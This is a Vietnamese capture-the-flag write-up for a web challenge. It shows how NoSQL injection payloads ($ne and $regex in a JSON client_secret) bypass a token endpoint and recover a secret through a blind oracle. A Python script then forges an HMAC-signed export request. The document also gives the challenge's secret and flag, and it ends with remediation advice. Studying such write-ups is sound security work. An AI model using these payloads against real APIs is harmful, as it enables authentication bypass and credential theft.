# Whisper — Web CTF write-up

## Tóm tắt

Whisper là partner API gateway. Trang `/clients` liệt kê `public-web` và `report-signer`; chỉ `report-signer` có scope `report:export`. Trang `/docs` cho biết:

- `POST /api/token` nhận `client_id` và `client_secret`;
- `POST /internal/export` yêu cầu request signature, không dùng bearer token;
- headers: `X-Client-Id`, `X-Timestamp` (Unix seconds, cửa sổ ±300 giây), `X-Signature`;
- chữ ký là HMAC-SHA256 trên chuỗi canonical; query được sort theo key rồi ghép `k=v` bằng `&`;
- endpoint trả gợi ý string-to-sign khi signature sai.

Lỗi nằm ở kiểm tra credential: backend chấp nhận MongoDB query operators trong `client_secret`. Dùng `$ne` để vượt bước xác thực, sau đó `$regex` làm oracle 200/401 để dò secret từng ký tự. Cuối cùng ký request export với secret đã khôi phục và nonce.

## 1. Khám phá API

Mở Burp Suite → **Proxy → HTTP history**, hoặc truy cập các trang công khai:

- `/clients`: xem client ID và scope;
- `/docs`: xem route và yêu cầu ký.

Các route đã xác minh:

```text
POST /api/token
POST /internal/export
```

## 2. Lấy token `report-signer` bằng NoSQL injection

Trong Burp Repeater gửi:

```http
POST /api/token HTTP/1.1
Host: <challenge-host>
Content-Type: application/json

{"client_id":"report-signer","client_secret":{"$ne":""}}
```

`client_secret` phải là **object JSON**, không phải chuỗi chứa JSON. Response thành công có dạng:

```json
{
  "access_token": "at_<random>",
  "token_type": "Bearer",
  "client_id": "report-signer",
  "scope": "read report:export"
}
```

`$ne` là MongoDB operator “khác”. Nếu backend ghép giá trị request trực tiếp vào MongoDB filter, điều kiện có thể trở thành `client_secret != ""`, vượt qua kiểm tra mà không cần biết secret.

Token giúp xác nhận đã lấy được danh tính/scope, nhưng export xác thực bằng HMAC `client_secret`, không bằng bearer token. Vì vậy cần khôi phục secret.

## 3. Khôi phục secret bằng `$regex` oracle

Thử trong Repeater:

```json
{"client_id":"report-signer","client_secret":{"$regex":".*"}}
```

Trên instance, pattern này trả `200` và token. Pattern không khớp, ví dụ `^a`, trả `401 invalid client credentials`. Pattern:

```json
{"client_id":"report-signer","client_secret":{"$regex":"^[a-f0-9]{32}$"}}
```

trả `200`, cho biết secret gồm 32 ký tự hex thường.

Dùng Burp Intruder để dò từng ký tự:

1. Trong Repeater, chọn request token → **Send to Intruder**.
2. Đặt payload marker sau prefix đã tìm được:

   ```json
   {"client_id":"report-signer","client_secret":{"$regex":"^<PREFIX>§§"}}
   ```

3. Chọn **Sniper** và dùng payload list `0123456789abcdef`.
4. Candidate đúng trả `200`/có `access_token`; candidate sai trả `401`.
5. Thêm ký tự đúng vào prefix và lặp lại đến đủ 32 ký tự.

Secret khôi phục được trên instance này:

```text
6e10160a5b7d31aea6ce2933b4db8415
```

## 4. Tạo HMAC cho export

Gửi `POST /internal/export`. Với body rỗng, SHA-256 body là:

```text
e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
```

String-to-sign gồm các dòng sau, ngăn cách bằng LF (`\n`):

```text
POST
/internal/export

<sha256-hex-body>
<timestamp>
<nonce>
```

Dòng thứ ba là canonical query (rỗng khi không có query string). Phải gửi `X-Nonce` và thêm đúng nonce vào dòng cuối; nếu thiếu, endpoint trả `replay protection: the signature covers one more line`.

Python để tính signature:

```python
import hashlib
import hmac
import time
import uuid

secret = "6e10160a5b7d31aea6ce2933b4db8415"
timestamp = str(int(time.time()))
nonce = uuid.uuid4().hex
body = b""
body_hash = hashlib.sha256(body).hexdigest()
canonical_query = ""  # query params sort theo key rồi ghép k=v bằng &
string_to_sign = "\n".join([
    "POST",
    "/internal/export",
    canonical_query,
    body_hash,
    timestamp,
    nonce,
])
signature = hmac.new(
    secret.encode(), string_to_sign.encode(), hashlib.sha256
).hexdigest()
print(timestamp, nonce, signature)
```

Đưa các giá trị vào Burp Repeater:

```http
POST /internal/export HTTP/1.1
Host: <challenge-host>
X-Client-Id: report-signer
X-Timestamp: <unix-seconds>
X-Nonce: <unique-nonce>
X-Signature: <lowercase-hex-hmac>

```

Timestamp phải trong ±300 giây. Nếu request có body hoặc query string, ký đúng byte body và canonical query sẽ gửi. Request thành công trên instance này trả:

```json
{
  "ok": true,
  "report": "export authorized",
  "flag": "hiCTF{bl1nd_regex_3xfil_then_f0rge_the_cust0m_s1gner_8c061d9180}"
}
```

## 5. Bản chất lỗi và khắc phục

- **NoSQL injection:** nhận object thay vì validate `client_secret` là string.
- **Blind secret oracle:** phản hồi khác nhau theo việc `$regex` có khớp hay không, cho phép dò secret ký tự một.
- **Ký request:** secret bị lộ khiến HMAC không còn chứng minh được danh tính client.

Cách vá: validate kiểu dữ liệu trước khi truy vấn; chỉ dựng filter MongoDB từ giá trị đã kiểm tra; không để credential endpoint làm oracle; giới hạn tốc độ thử; dùng secret đủ mạnh và luân chuyển secret sau sự cố.
